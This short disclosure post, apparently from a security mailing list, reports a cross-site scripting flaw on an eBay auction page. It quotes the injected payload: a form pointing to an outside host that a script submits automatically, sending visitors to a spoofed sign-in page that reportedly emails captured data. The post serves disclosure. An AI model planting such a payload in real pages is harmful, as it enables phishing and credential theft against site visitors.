Subject: Ebay XSS


The linked auction demonstrates an XSS flaw within ebay:

http://cgi.ebay.com/ebaymotors/Ford-Mustang-Just-L-K_W0QQitemZ4617729712QQcategoryZ6236QQrdZ1QQcmdZViewItem

The affected code is below the line "On Feb-28-06 at 16:31:39 PST,
seller added the following information:"

<form name="xxx"
action="http://wyckoffbakerycafe.com/Store/SignInco_partnerId2pUserIdsiteid0pageTypepa1i1bshowgifUsingSSL.html">
</form>
<script>
xxx.submit();
</script>

The redirection page seems to be simple spoofing, and emails the data
to cont_26_32@...oo.com.
